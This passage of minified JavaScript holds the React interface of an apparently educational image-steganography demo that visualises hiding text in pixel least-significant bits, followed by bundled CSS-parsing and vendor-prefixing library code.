                                                    display: "flex",
                                                    alignItems: "center",
                                                    fontSize: 13,
                                                    fontWeight: 700,
                                                  },
                                                  onDrop: (Ut) => Vt("B", Ut),
                                                  onDragOver: Dt === 7 && Mt,
                                                  children: It.B[Dt],
                                                },
                                                jt
                                              )
                                            ),
                                      }),
                                    ],
                                  }),
                                }),
                                jsxRuntimeExports.jsx("div", {
                                  style: {
                                    width: "98%",
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "flex-end",
                                    marginTop: 20,
                                  },
                                  children: jsxRuntimeExports.jsx(Button, {
                                    style: {
                                      background:
                                        Et < 6
                                          ? "grey"
                                          : "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                                      color: "white",
                                      marginInline: 2,
                                    },
                                    disabled: Et < 6,
                                    onClick: Ft,
                                    children: "Auto",
                                  }),
                                }),
                              ],
                            }),
                        ],
                      }),
                    nt === 2 &&
                      gt &&
                      jsxRuntimeExports.jsxs("div", {
                        style: {
                          height: "100%",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "flex-start",
                          flexDirection: "column",
                        },
                        children: [
                          jsxRuntimeExports.jsxs("div", {
                            style: {
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              width: "60%",
                            },
                            children: [
                              jsxRuntimeExports.jsx("h5", {
                                style: { color: "black" },
                                children: "Modified Image",
                              }),
                              jsxRuntimeExports.jsx(Button, {
                                style: { marginLeft: 10 },
                                onClick: Tt,
                                children: "Download",
                              }),
                            ],
                          }),
                          jsxRuntimeExports.jsx("img", {
                            alt: "selected",
                            src: listImages[a - 1],
                            style: {
                              width: "70%",
                              height: "70%",
                              borderRadius: 20,
                            },
                          }),
                          jsxRuntimeExports.jsxs("div", {
                            style: {
                              display: "flex",
                              alignItems: "center",
                              flexDirection: "column",
                              justifyContent: "center",
                              padding: 10,
                            },
                            children: [
                              jsxRuntimeExports.jsx(Button, {
                                onClick: () => {
                                  Nt(
                                    updateCheckedValue(2),
                                    Nt(updateClearSteps()),
                                    Nt(
                                      updateSteps(
                                        "Shows the bit level details of the original image and the modified image after inserting the message."
                                      )
                                    ),
                                    Nt(
                                      updateSteps(
                                        "Press Unhide Text to extract the hidden message."
                                      )
                                    )
                                  );
                                },
                                children: "Decode",
                              }),
                              jsxRuntimeExports.jsxs("h4", {
                                style: {
                                  color: "black",
                                  textTransform: "uppercase",
                                  fontSize: 12,
                                },
                                children: [
                                  "If you want to encode again?",
                                  " ",
                                  jsxRuntimeExports.jsx("a", {
                                    onClick: () => {
                                      Nt(onClearAll());
                                    },
                                    style: {
                                      color: "blue",
                                      textDecoration: "underline",
                                    },
                                    children: "Encode",
                                  }),
                                ],
                              }),
                            ],
                          }),
                        ],
                      }),
                  ],
                })
              : jsxRuntimeExports.jsx("div", {
                  children: jsxRuntimeExports.jsx(ImageComponent$1, {}),
                }),
          }),
          i &&
            nt !== 3 &&
            jsxRuntimeExports.jsxs("div", {
              style: {
                flex: 0.05,
                display: "flex",
                justifyContent: "space-between",
                cursor: "pointer",
              },
              children: [
                jsxRuntimeExports.jsx("div", {
                  style: {
                    flex: 0.495,
                    background: nt >= 1 ? "#0c2135" : "grey",
                    color: "white",
                    borderTopRightRadius: 30,
                    padding: 5,
                    cursor: nt === 0 ? "not-allowed" : "pointer",
                  },
                  onClick: nt === 0 ? null : Lt,
                  children: jsxRuntimeExports.jsx("h5", {
                    style: { textAlign: "center", margin: 0 },
                    children: "Prev",
                  }),
                }),
                jsxRuntimeExports.jsx("div", {
                  style: {
                    flex: 0.495,
                    background: nt >= 0 && nt <= 1 && o ? "#0c2135" : "grey",
                    borderTopLeftRadius: 30,
                    cursor: nt >= 0 && nt <= 1 && o ? "pointer" : "not-allowed",
                    padding: 5,
                  },
                  onClick: nt >= 0 && nt <= 1 && o ? At : null,
                  children: jsxRuntimeExports.jsx("h5", {
                    style: { textAlign: "center", margin: 0, color: "white" },
                    children: "Next",
                  }),
                }),
              ],
            }),
        ],
      })
    );
  },
  RGBComponent = ({
    data: i,
    isSelectAuto: a = !1,
    setIsSelectAuto: o = () => {},
    isModified: s = !1,
  }) => {
    var tt, nt, ot;
    return jsxRuntimeExports.jsxs("div", {
      children: [
        " ",
        jsxRuntimeExports.jsxs("div", {
          style: {
            display: "flex",
            background: "#0c2136",
            flex: 0.15,
            color: "white",
            height: 20,
            alignItems: "center",
          },
          children: [
            jsxRuntimeExports.jsx("h6", {
              style: {
                flex: 0.35,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                borderRigthStyle: "solid",
                borderRightWidth: 1,
                borderRightColor: "white",
              },
              children: "R(0)",
            }),
            jsxRuntimeExports.jsx("h6", {
              style: {
                flex: 0.35,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              },
              children: "G(0)",
            }),
            jsxRuntimeExports.jsx("h6", {
              style: {
                flex: 0.35,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              },
              children: "B(255)",
            }),
          ],
        }),
        jsxRuntimeExports.jsx("div", {
          style: {
            flex: 0.4,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-around",
            marginBottom: "10px",
          },
          children: jsxRuntimeExports.jsxs("div", {
            style: { display: "flex", flex: 1 },
            children: [
              jsxRuntimeExports.jsx("div", {
                style: {
                  flex: 0.35,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                },
                children:
                  a && s
                    ? jsxRuntimeExports.jsx(BinaryAnimation, {})
                    : (tt = i.R) == null
                    ? void 0
                    : tt.map((st, ft) =>
                        jsxRuntimeExports.jsx(
                          "div",
                          {
                            style: {
                              width: 18,
                              height: 30,
                              padding: 5,
                              marginInline: 1,
                              background:
                                ft === 7 && s
                                  ? "grey"
                                  : "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                              color: "white",
                              display: "flex",
                              alignItems: "center",
                              fontSize: 13,
                              fontWeight: 700,
                            },
                            children: st,
                          },
                          st
                        )
                      ),
              }),
              jsxRuntimeExports.jsx("div", {
                style: {
                  flex: 0.35,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                },
                children:
                  a && s
                    ? jsxRuntimeExports.jsx(BinaryAnimation, {})
                    : (nt = i.G) == null
                    ? void 0
                    : nt.map((st, ft) =>
                        jsxRuntimeExports.jsx(
                          "div",
                          {
                            style: {
                              width: 18,
                              height: 30,
                              padding: 5,
                              marginInline: 1,
                              background:
                                ft === 7 && s
                                  ? "grey"
                                  : "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                              color: "white",
                              display: "flex",
                              alignItems: "center",
                              fontSize: 13,
                              fontWeight: 700,
                            },
                            children: st,
                          },
                          st
                        )
                      ),
              }),
              jsxRuntimeExports.jsx("div", {
                style: {
                  flex: 0.35,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                },
                children:
                  a && s
                    ? jsxRuntimeExports.jsx(BinaryAnimation, {})
                    : (ot = i.B) == null
                    ? void 0
                    : ot.map((st, ft) =>
                        jsxRuntimeExports.jsx(
                          "div",
                          {
                            style: {
                              width: 18,
                              height: 30,
                              padding: 5,
                              marginInline: 1,
                              background:
                                ft === 7 && s
                                  ? "grey"
                                  : "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                              color: "white",
                              display: "flex",
                              alignItems: "center",
                              fontSize: 13,
                              fontWeight: 700,
                            },
                            children: st,
                          },
                          st
                        )
                      ),
              }),
            ],
          }),
        }),
      ],
    });
  },
  ExtractTextFromImage = ({ isSelectAuto: i, setIsSelectAuto: a }) => {
    const { selectedImageId: o, insertText: s } = useSelector((ht) => ht.exp),
      tt = s
        .split("")
        .map((ht) => ht.charCodeAt(0).toString(2).padStart(8, "0"))
        .join("");
    console.log(tt),
      reactExports.useEffect(() => {
        let ht;
        return (
          i &&
            (ht = setTimeout(() => {
              a(!1);
            }, 5e3)),
          () => {
            clearTimeout(ht);
          }
        );
      }, [i, a]);
    const nt = tt.length,
      ot = Math.ceil(nt / 3),
      st = Array.from({ length: ot }, () => ({
        R: Array(8).fill(0),
        G: Array(8).fill(0),
        B: Array(8).fill(1),
      })),
      ft = st.map((ht, gt) => {
        const St = gt * 3 < nt ? Number(tt[gt * 3]) : ht.R[7],
          vt = gt * 3 + 1 < nt ? Number(tt[gt * 3 + 1]) : ht.G[7],
          _t = gt * 3 + 2 < nt ? Number(tt[gt * 3 + 2]) : ht.B[7];
        return {
          R: [...ht.R.slice(0, 7), St],
          G: [...ht.G.slice(0, 7), vt],
          B: [...ht.B.slice(0, 7), _t],
        };
      });
    return jsxRuntimeExports.jsxs("div", {
      style: styles.container,
      children: [
        jsxRuntimeExports.jsxs("div", {
          style: styles.imageSection,
          children: [
            jsxRuntimeExports.jsx(ImageDisplay, {
              title: "Original Image",
              src: listImages[o - 1],
            }),
            jsxRuntimeExports.jsx("div", {
              id: "scroll",
              style: { overflowY: "auto", height: 200 },
              children: st.map((ht, gt) =>
                jsxRuntimeExports.jsx(RGBComponent, { data: ht }, gt)
              ),
            }),
          ],
        }),
        jsxRuntimeExports.jsxs("div", {
          style: styles.imageSection,
          children: [
            jsxRuntimeExports.jsx(ImageDisplay, {
              title: "Modified Image",
              src: listImages[o - 1],
            }),
            i
              ? jsxRuntimeExports.jsx(TextDisplay, {
                  binaryText: tt,
                  hiddenText: s,
                })
              : jsxRuntimeExports.jsx("div", {
                  id: "scroll",
                  style: { overflowY: "auto", height: 200 },
                  children: ft.map((ht, gt) =>
                    jsxRuntimeExports.jsx(
                      RGBComponent,
                      { isModified: !0, data: ht },
                      gt
                    )
                  ),
                }),
          ],
        }),
      ],
    });
  },
  ImageDisplay = ({ title: i, src: a }) =>
    jsxRuntimeExports.jsxs("div", {
      style: styles.imageDisplay,
      children: [
        jsxRuntimeExports.jsx("h6", { children: i }),
        jsxRuntimeExports.jsx("img", { style: styles.image, src: a, alt: i }),
      ],
    }),
  TextDisplay = ({ binaryText: i, hiddenText: a }) =>
    jsxRuntimeExports.jsxs("div", {
      style: { color: "black" },
      children: [
        jsxRuntimeExports.jsxs("h5", {
          children: [
            "Binary String: ",
            jsxRuntimeExports.jsx("b", { children: i }),
          ],
        }),
        jsxRuntimeExports.jsxs("h5", {
          children: [
            "Hidden Text: ",
            jsxRuntimeExports.jsx("b", {
              style: styles.hiddenText,
              children: a,
            }),
          ],
        }),
      ],
    }),
  styles = {
    container: {
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      height: "100%",
      flex: 1,
    },
    imageSection: {
      flex: 0.5,
      display: "flex",
      flexDirection: "column",
      marginInline: 10,
      overflow: "hidden",
    },
    imageDisplay: {
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      marginBottom: 50,
    },
    image: { width: "80%", height: "100%", borderRadius: 20 },
    hiddenText: { marginInline: "5px", color: "green" },
  },
  UnHideTextComponent = () => {
    const { openEditText: i } = useSelector((nt) => nt.exp),
      [a, o] = reactExports.useState(!1),
      s = useDispatch(),
      tt = () => {
        o(!0),
          s(
            updateSteps(
              "Decoding step is over, Click “Real Time Simulation” to see a walk-through of how this technique is leveraged by a malware."
            )
          );
      };
    return (
      reactExports.useEffect(() => {
        o(!1);
      }, [i]),
      console.log(i, "open"),
      jsxRuntimeExports.jsxs("div", {
        style: {
          display: "flex",
          flex: 0.8,
          width: "100%",
          flexDirection: "column",
          height: "80%",
          marginBottom: 10,
        },
        children: [
          jsxRuntimeExports.jsx("div", {
            style: { background: "#0c2136", height: 50 },
            children: jsxRuntimeExports.jsx("h4", {
              style: { textAlign: "center", color: "white" },
              children: "Decoding",
            }),
          }),
          jsxRuntimeExports.jsxs("div", {
            style: {
              background: "white",
              display: "flex",
              height: "100%",
              flex: 1,
              flexDirection: "column",
              cursor: "pointer",
            },
            children: [
              i
                ? jsxRuntimeExports.jsx(ExtractTextFromImage, {
                    isSelectAuto: a,
                    setIsSelectAuto: o,
                  })
                : jsxRuntimeExports.jsx(ImageComponent$1, {}),
              i &&
                jsxRuntimeExports.jsx(Button, {
                  style: {
                    padding: 5,
                    height: 55,
                    background: a
                      ? "grey"
                      : "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                    color: "white",
                  },
                  onClick: tt,
                  disabled: a,
                  children: "Unhide Text",
                }),
            ],
          }),
        ],
      })
    );
  },
  getRandomBinary = () => Math.floor(Math.random() * 2),
  Bit = ({ color: i = "green", isChange: a = !1 }) => {
    const { isEncoder: o } = useSelector((nt) => nt.exp),
      [s, tt] = reactExports.useState(getRandomBinary());
    return (
      console.log(a),
      reactExports.useEffect(() => {
        if (o || a) {
          const nt = setInterval(() => {
            tt(getRandomBinary());
          }, 700);
          return () => clearInterval(nt);
        }
      }, [o, a]),
      jsxRuntimeExports.jsx("div", {
        style: {
          width: 20,
          height: 30,
          background: i,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        },
        children: jsxRuntimeExports.jsx("h5", {
          style: { margin: 0, color: "white", fontWeight: 700 },
          children: s ? 0 : 1,
        }),
      })
    );
  },
  Byte = ({ pixel: i = "Red", isChange: a = !1, isZero: o = !1 }) => (
    console.log(a),
    jsxRuntimeExports.jsxs("div", {
      style: {
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        marginInline: 2,
      },
      children: [
        jsxRuntimeExports.jsx("div", {
          children: jsxRuntimeExports.jsx("h5", {
            style: { textAlign: "center", color: "white" },
            children: i,
          }),
        }),
        jsxRuntimeExports.jsx("div", {
          style: {
            width: 180,
            height: 40,
            border: "1px solid green",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            paddingInline: 3,
            position: "relative",
            overflow: "hidden",
          },
          children: jsxRuntimeExports.jsxs("div", {
            style: {
              display: "flex",
              justifyContent: "space-between",
              flex: 1,
            },
            children: [
              a &&
                jsxRuntimeExports.jsx("div", {
                  className: "change-bit",
                  style: { position: "absolute", right: 3, top: 4 },
                  children: jsxRuntimeExports.jsx(Bit, {
                    isZero: o,
                    color: "red",
                    isChange: a,
                  }),
                }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
              jsxRuntimeExports.jsx(Bit, { isZero: o, isChange: a }),
            ],
          }),
        }),
      ],
    })
  );
var __assign = function () {
  return (
    (__assign =
      Object.assign ||
      function (a) {
        for (var o, s = 1, tt = arguments.length; s < tt; s++) {
          o = arguments[s];
          for (var nt in o)
            Object.prototype.hasOwnProperty.call(o, nt) && (a[nt] = o[nt]);
        }
        return a;
      }),
    __assign.apply(this, arguments)
  );
};
function __spreadArray(i, a, o) {
  if (o || arguments.length === 2)
    for (var s = 0, tt = a.length, nt; s < tt; s++)
      (nt || !(s in a)) &&
        (nt || (nt = Array.prototype.slice.call(a, 0, s)), (nt[s] = a[s]));
  return i.concat(nt || Array.prototype.slice.call(a));
}
typeof SuppressedError == "function" && SuppressedError;
var MS = "-ms-",
  MOZ = "-moz-",
  WEBKIT = "-webkit-",
  COMMENT = "comm",
  RULESET = "rule",
  DECLARATION = "decl",
  IMPORT = "@import",
  KEYFRAMES = "@keyframes",
  LAYER = "@layer",
  abs = Math.abs,
  from = String.fromCharCode,
  assign = Object.assign;
function hash(i, a) {
  return charat(i, 0) ^ 45
    ? (((((((a << 2) ^ charat(i, 0)) << 2) ^ charat(i, 1)) << 2) ^
        charat(i, 2)) <<
        2) ^
        charat(i, 3)
    : 0;
}
function trim(i) {
  return i.trim();
}
function match(i, a) {
  return (i = a.exec(i)) ? i[0] : i;
}
function replace(i, a, o) {
  return i.replace(a, o);
}
function indexof(i, a, o) {
  return i.indexOf(a, o);
}
function charat(i, a) {
  return i.charCodeAt(a) | 0;
}
function substr(i, a, o) {
  return i.slice(a, o);
}
function strlen(i) {
  return i.length;
}
function sizeof(i) {
  return i.length;
}
function append(i, a) {
  return a.push(i), i;
}
function combine(i, a) {
  return i.map(a).join("");
}
function filter(i, a) {
  return i.filter(function (o) {
    return !match(o, a);
  });
}
var line = 1,
  column = 1,
  length = 0,
  position = 0,
  character = 0,
  characters = "";
function node(i, a, o, s, tt, nt, ot, st) {
  return {
    value: i,
    root: a,
    parent: o,
    type: s,
    props: tt,
    children: nt,
    line,
    column,
    length: ot,
    return: "",
    siblings: st,
  };
}
function copy(i, a) {
  return assign(
    node("", null, null, "", null, null, 0, i.siblings),
    i,
    { length: -i.length },
    a
  );
}
function lift(i) {
  for (; i.root; ) i = copy(i.root, { children: [i] });
  append(i, i.siblings);
}
function char() {
  return character;
}
function prev() {
  return (
    (character = position > 0 ? charat(characters, --position) : 0),
    column--,
    character === 10 && ((column = 1), line--),
    character
  );
}
function next() {
  return (
    (character = position < length ? charat(characters, position++) : 0),
    column++,
    character === 10 && ((column = 1), line++),
    character
  );
}
function peek() {
  return charat(characters, position);
}
function caret() {
  return position;
}
function slice(i, a) {
  return substr(characters, i, a);
}
function token(i) {
  switch (i) {
    case 0:
    case 9:
    case 10:
    case 13:
    case 32:
      return 5;
    case 33:
    case 43:
    case 44:
    case 47:
    case 62:
    case 64:
    case 126:
    case 59:
    case 123:
    case 125:
      return 4;
    case 58:
      return 3;
    case 34:
    case 39:
    case 40:
    case 91:
      return 2;
    case 41:
    case 93:
      return 1;
  }
  return 0;
}
function alloc(i) {
  return (
    (line = column = 1), (length = strlen((characters = i))), (position = 0), []
  );
}
function dealloc(i) {
  return (characters = ""), i;
}
function delimit(i) {
  return trim(
    slice(position - 1, delimiter(i === 91 ? i + 2 : i === 40 ? i + 1 : i))
  );
}
function whitespace(i) {
  for (; (character = peek()) && character < 33; ) next();
  return token(i) > 2 || token(character) > 3 ? "" : " ";
}
function escaping(i, a) {
  for (
    ;
    --a &&
    next() &&
    !(
      character < 48 ||
      character > 102 ||
      (character > 57 && character < 65) ||
      (character > 70 && character < 97)
    );

  );
  return slice(i, caret() + (a < 6 && peek() == 32 && next() == 32));
}
function delimiter(i) {
  for (; next(); )
    switch (character) {
      case i:
        return position;
      case 34:
      case 39:
        i !== 34 && i !== 39 && delimiter(character);
        break;
      case 40:
        i === 41 && delimiter(i);
        break;
      case 92:
        next();
        break;
    }
  return position;
}
function commenter(i, a) {
  for (; next() && i + character !== 57; )
    if (i + character === 84 && peek() === 47) break;
  return "/*" + slice(a, position - 1) + "*" + from(i === 47 ? i : next());
}
function identifier(i) {
  for (; !token(peek()); ) next();
  return slice(i, position);
}
function compile(i) {
  return dealloc(parse("", null, null, null, [""], (i = alloc(i)), 0, [0], i));
}
function parse(i, a, o, s, tt, nt, ot, st, ft) {
  for (
    var ht = 0,
      gt = 0,
      St = ot,
      vt = 0,
      _t = 0,
      Et = 0,
      Ct = 1,
      Pt = 1,
      bt = 1,
      xt = 0,
      yt = "",
      wt = tt,
      $t = nt,
      kt = s,
      Rt = yt;
    Pt;

  )
    switch (((Et = xt), (xt = next()))) {
      case 40:
        if (Et != 108 && charat(Rt, St - 1) == 58) {
          indexof(
            (Rt += replace(delimit(xt), "&", "&\f")),
            "&\f",
            abs(ht ? st[ht - 1] : 0)
          ) != -1 && (bt = -1);
          break;
        }
      case 34:
      case 39:
      case 91:
        Rt += delimit(xt);
        break;
      case 9:
      case 10:
      case 13:
      case 32:
        Rt += whitespace(Et);
        break;
      case 92:
        Rt += escaping(caret() - 1, 7);
        continue;
      case 47:
        switch (peek()) {
          case 42:
          case 47:
            append(comment(commenter(next(), caret()), a, o, ft), ft);
            break;
          default:
            Rt += "/";
        }
        break;
      case 123 * Ct:
        st[ht++] = strlen(Rt) * bt;
      case 125 * Ct:
      case 59:
      case 0:
        switch (xt) {
          case 0:
          case 125:
            Pt = 0;
          case 59 + gt:
            bt == -1 && (Rt = replace(Rt, /\f/g, "")),
              _t > 0 &&
                strlen(Rt) - St &&
                append(
                  _t > 32
                    ? declaration(Rt + ";", s, o, St - 1, ft)
                    : declaration(replace(Rt, " ", "") + ";", s, o, St - 2, ft),
                  ft
                );
            break;
          case 59:
            Rt += ";";
          default:
            if (
              (append(
                (kt = ruleset(
                  Rt,
                  a,
                  o,
                  ht,
                  gt,
                  tt,
                  st,
                  yt,
                  (wt = []),
                  ($t = []),
                  St,
                  nt
                )),
                nt
              ),
              xt === 123)
            )
              if (gt === 0) parse(Rt, a, kt, kt, wt, nt, St, st, $t);
              else
                switch (vt === 99 && charat(Rt, 3) === 110 ? 100 : vt) {
                  case 100:
                  case 108:
                  case 109:
                  case 115:
                    parse(
                      i,
                      kt,
                      kt,
                      s &&
                        append(
                          ruleset(
                            i,
                            kt,
                            kt,
                            0,
                            0,
                            tt,
                            st,
                            yt,
                            tt,
                            (wt = []),
                            St,
                            $t
                          ),
                          $t
                        ),
                      tt,
                      $t,
                      St,
                      st,
                      s ? wt : $t
                    );
                    break;
                  default:
                    parse(Rt, kt, kt, kt, [""], $t, 0, st, $t);
                }
        }
        (ht = gt = _t = 0), (Ct = bt = 1), (yt = Rt = ""), (St = ot);
        break;
      case 58:
        (St = 1 + strlen(Rt)), (_t = Et);
      default:
        if (Ct < 1) {
          if (xt == 123) --Ct;
          else if (xt == 125 && Ct++ == 0 && prev() == 125) continue;
        }
        switch (((Rt += from(xt)), xt * Ct)) {
          case 38:
            bt = gt > 0 ? 1 : ((Rt += "\f"), -1);
            break;
          case 44:
            (st[ht++] = (strlen(Rt) - 1) * bt), (bt = 1);
            break;
          case 64:
            peek() === 45 && (Rt += delimit(next())),
              (vt = peek()),
              (gt = St = strlen((yt = Rt += identifier(caret())))),
              xt++;
            break;
          case 45:
            Et === 45 && strlen(Rt) == 2 && (Ct = 0);
        }
    }
  return nt;
}
function ruleset(i, a, o, s, tt, nt, ot, st, ft, ht, gt, St) {
  for (
    var vt = tt - 1,
      _t = tt === 0 ? nt : [""],
      Et = sizeof(_t),
      Ct = 0,
      Pt = 0,
      bt = 0;
    Ct < s;
    ++Ct
  )
    for (
      var xt = 0, yt = substr(i, vt + 1, (vt = abs((Pt = ot[Ct])))), wt = i;
      xt < Et;
      ++xt
    )
      (wt = trim(Pt > 0 ? _t[xt] + " " + yt : replace(yt, /&\f/g, _t[xt]))) &&
        (ft[bt++] = wt);
  return node(i, a, o, tt === 0 ? RULESET : st, ft, ht, gt, St);
}
function comment(i, a, o, s) {
  return node(i, a, o, COMMENT, from(char()), substr(i, 2, -2), 0, s);
}
function declaration(i, a, o, s, tt) {
  return node(
    i,
    a,
    o,
    DECLARATION,
    substr(i, 0, s),
    substr(i, s + 1, -1),
    s,
    tt
  );
}
function prefix(i, a, o) {
  switch (hash(i, a)) {
    case 5103:
      return WEBKIT + "print-" + i + i;
    case 5737:
    case 4201:
    case 3177:
    case 3433:
    case 1641:
    case 4457:
    case 2921:
    case 5572:
    case 6356:
    case 5844:
    case 3191:
    case 6645:
    case 3005:
    case 6391:
    case 5879:
    case 5623:
    case 6135:
    case 4599:
    case 4855:
    case 4215:
    case 6389:
    case 5109:
    case 5365:
    case 5621:
    case 3829:
      return WEBKIT + i + i;
    case 4789:
      return MOZ + i + i;
    case 5349:
    case 4246:
    case 4810:
    case 6968:
    case 2756:
      return WEBKIT + i + MOZ + i + MS + i + i;
    case 5936:
      switch (charat(i, a + 11)) {
        case 114:
          return WEBKIT + i + MS + replace(i, /[svh]\w+-[tblr]{2}/, "tb") + i;
        case 108:
          return (
            WEBKIT + i + MS + replace(i, /[svh]\w+-[tblr]{2}/, "tb-rl") + i
          );
        case 45:
          return WEBKIT + i + MS + replace(i, /[svh]\w+-[tblr]{2}/, "lr") + i;
      }
    case 6828:
    case 4268:
    case 2903:
      return WEBKIT + i + MS + i + i;
    case 6165:
      return WEBKIT + i + MS + "flex-" + i + i;
    case 5187:
      return (
        WEBKIT +
        i +
        replace(i, /(\w+).+(:[^]+)/, WEBKIT + "box-$1$2" + MS + "flex-$1$2") +
        i
      );
    case 5443:
      return (
        WEBKIT +
        i +
        MS +
        "flex-item-" +
        replace(i, /flex-|-self/g, "") +
        (match(i, /flex-|baseline/)
          ? ""
          : MS + "grid-row-" + replace(i, /flex-|-self/g, "")) +
        i
      );
    case 4675:
      return (
        WEBKIT +
        i +
        MS +
        "flex-line-pack" +
        replace(i, /align-content|flex-|-self/g, "") +
        i
      );
    case 5548:
      return WEBKIT + i + MS + replace(i, "shrink", "negative") + i;
    case 5292:
      return WEBKIT + i + MS + replace(i, "basis", "preferred-size") + i;
    case 6060:
      return (
        WEBKIT +
        "box-" +
        replace(i, "-grow", "") +
        WEBKIT +
        i +
        MS +
        replace(i, "grow", "positive") +
        i
      );
    case 4554:
      return (
        WEBKIT + replace(i, /([^-])(transform)/g, "$1" + WEBKIT + "$2") + i
      );
    case 6187:
      return (
        replace(
          replace(
            replace(i, /(zoom-|grab)/, WEBKIT + "$1"),
            /(image-set)/,
            WEBKIT + "$1"
          ),
          i,
          ""
        ) + i
      );
    case 5495:
    case 3959:
      return replace(i, /(image-set\([^]*)/, WEBKIT + "$1$`$1");
    case 4968:
      return (
        replace(
          replace(
            i,
            /(.+:)(flex-)?(.*)/,
            WEBKIT + "box-pack:$3" + MS + "flex-pack:$3"
          ),
          /s.+-b[^;]+/,
          "justify"
        ) +
        WEBKIT +
        i +
        i
      );
    case 4200:
      if (!match(i, /flex-|baseline/))
        return MS + "grid-column-align" + substr(i, a) + i;
      break;
    case 2592:
    case 3360:
      return MS + replace(i, "template-", "") + i;
    case 4384:
    case 3616:
      return o &&
        o.some(function (s, tt) {
          return (a = tt), match(s.props, /grid-\w+-end/);
        })
        ? ~indexof(i + (o = o[a].value), "span", 0)
          ? i
          : MS +
            replace(i, "-start", "") +
            i +
            MS +
            "grid-row-span:" +
            (~indexof(o, "span", 0)
              ? match(o, /\d+/)
              : +match(o, /\d+/) - +match(i, /\d+/)) +
            ";"
        : MS + replace(i, "-start", "") + i;
    case 4896:
    case 4128:
      return o &&
        o.some(function (s) {
          return match(s.props, /grid-\w+-start/);
        })
        ? i
        : MS + replace(replace(i, "-end", "-span"), "span ", "") + i;
    case 4095:
    case 3583:
    case 4068:
    case 2532:
      return replace(i, /(.+)-inline(.+)/, WEBKIT + "$1$2") + i;
    case 8116:
    case 7059:
    case 5753:
    case 5535:
    case 5445:
    case 5701:
    case 4933:
    case 4677:
    case 5533:
    case 5789:
    case 5021:
    case 4765:
      if (strlen(i) - 1 - a > 6)
        switch (charat(i, a + 1)) {
          case 109:
            if (charat(i, a + 4) !== 45) break;
          case 102:
            return (
              replace(
                i,
                /(.+:)(.+)-([^]+)/,
                "$1" +
                  WEBKIT +
                  "$2-$3$1" +
                  MOZ +
                  (charat(i, a + 3) == 108 ? "$3" : "$2-$3")
              ) + i
            );
          case 115:
            return ~indexof(i, "stretch", 0)
              ? prefix(replace(i, "stretch", "fill-available"), a, o) + i
              : i;
        }
      break;
    case 5152:
    case 5920:
      return replace(
        i,
        /(.+?):(\d+)(\s*\/\s*(span)?\s*(\d+))?(.*)/,
        function (s, tt, nt, ot, st, ft, ht) {
          return (
            MS +
            tt +
            ":" +
            nt +
            ht +
            (ot ? MS + tt + "-span:" + (st ? ft : +ft - +nt) + ht : "") +
            i
          );
        }
      );
    case 4949:
      if (charat(i, a + 6) === 121) return replace(i, ":", ":" + WEBKIT) + i;
      break;
    case 6444:
      switch (charat(i, charat(i, 14) === 45 ? 18 : 11)) {
        case 120:
          return (
            replace(
              i,
              /(.+:)([^;\s!]+)(;|(\s+)?!.+)?/,
              "$1" +
                WEBKIT +
                (charat(i, 14) === 45 ? "inline-" : "") +
                "box$3$1" +
                WEBKIT +
                "$2$3$1" +
                MS +
                "$2box$3"
            ) + i
          );
        case 100:
          return replace(i, ":", ":" + MS) + i;
      }
      break;
    case 5719:
    case 2647:
    case 2135:
    case 3927:
    case 2391:
      return replace(i, "scroll-", "scroll-snap-") + i;
  }
  return i;
}
function serialize(i, a) {
  for (var o = "", s = 0; s < i.length; s++) o += a(i[s], s, i, a) || "";
  return o;
}
function stringify(i, a, o, s) {
  switch (i.type) {
    case LAYER:
      if (i.children.length) break;
    case IMPORT:
    case DECLARATION:
      return (i.return = i.return || i.value);
    case COMMENT:
      return "";
    case KEYFRAMES:
      return (i.return = i.value + "{" + serialize(i.children, s) + "}");
    case RULESET:
      if (!strlen((i.value = i.props.join(",")))) return "";
  }
  return strlen((o = serialize(i.children, s)))
    ? (i.return = i.value + "{" + o + "}")
    : "";
}
function middleware(i) {
  var a = sizeof(i);
  return function (o, s, tt, nt) {
    for (var ot = "", st = 0; st < a; st++) ot += i[st](o, s, tt, nt) || "";
    return ot;
  };
}
function rulesheet(i) {
  return function (a) {
    a.root || ((a = a.return) && i(a));
  };
}
function prefixer(i, a, o, s) {
  if (i.length > -1 && !i.return)
    switch (i.type) {
      case DECLARATION:
        i.return = prefix(i.value, i.length, o);
        return;
      case KEYFRAMES:
        return serialize(
          [copy(i, { value: replace(i.value, "@", "@" + WEBKIT) })],
          s
        );
      case RULESET:
        if (i.length)
          return combine((o = i.props), function (tt) {
            switch (match(tt, (s = /(::plac\w+|:read-\w+)/))) {
              case ":read-only":
              case ":read-write":
                lift(
                  copy(i, {
                    props: [replace(tt, /:(read-\w+)/, ":" + MOZ + "$1")],
                  })
                ),
                  lift(copy(i, { props: [tt] })),
                  assign(i, { props: filter(o, s) });
                break;
              case "::placeholder":
                lift(
                  copy(i, {
                    props: [
                      replace(tt, /:(plac\w+)/, ":" + WEBKIT + "input-$1"),
                    ],
                  })
                ),
                  lift(
                    copy(i, {
                      props: [replace(tt, /:(plac\w+)/, ":" + MOZ + "$1")],
                    })
                  ),
                  lift(
                    copy(i, {
